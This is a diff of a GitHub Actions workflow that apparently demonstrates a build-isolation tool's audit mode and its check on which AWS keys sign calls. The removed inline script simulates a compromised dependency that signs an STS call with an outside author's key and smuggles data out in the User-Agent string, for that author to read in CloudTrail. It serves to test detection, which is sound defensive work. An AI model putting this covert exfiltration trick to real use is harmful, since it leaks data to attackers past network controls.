@@ -15,6 +15,10 @@ jobs:
       id-token: write
 
     steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
       - name: Get the role's keys through OIDC
         uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
         with:
@@ -22,11 +26,10 @@ jobs:
           aws-region: us-east-1
 
       # No account is named yet, so the report's "Restrict Would Refuse" counts
-      # the call signed with the switched role's key as well as the
+      # the call signed with the switched role's key as well as the compromised
       # dependency's, and its "Switch to restrict mode" example returns the URL
       # rules, aws_key_check and the role's account, marked for you to check it
-      # is yours. No STS answer issued the dependency's key, so it adds no
-      # account.
+      # is yours. No STS answer issued that key, so it adds no account.
       - name: Discover required URLs and accounts with isolated-run
         uses: buildcage/isolated-run@4533b0b5f31b7084de488a0d7a46b8917afcbb4d # v2.2.0-rc4
         env:
@@ -34,23 +37,4 @@ jobs:
         with:
           proxy_mode: audit
           aws_key_check: true
-          run: |
-            # Signed with the key the step was given: passes.
-            aws sts get-caller-identity
-
-            # Signed with the key of a role the step switched to.
-            (
-              read -r AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN < <(
-                aws sts assume-role --role-arn "$SWITCHED_ROLE_ARN" --role-session-name buildcage-example \
-                  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
-              )
-              export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
-              aws sts get-caller-identity
-            )
-
-            # A compromised dependency signs a call with its author's key and
-            # carries data out in the User-Agent, for the author to read in
-            # their own CloudTrail. AWS's documented example key ID, built at
-            # run time so the file holds no key-shaped literal.
-            env -u AWS_SESSION_TOKEN AWS_ACCESS_KEY_ID="AKIA$(printf IOSFODNN7EXAMPLE)" AWS_SECRET_ACCESS_KEY=example \
-              AWS_SDK_UA_APP_ID=exfiltrated-data aws sts get-caller-identity || true
+          run: .github/examples/aws-key-check/deploy.sh
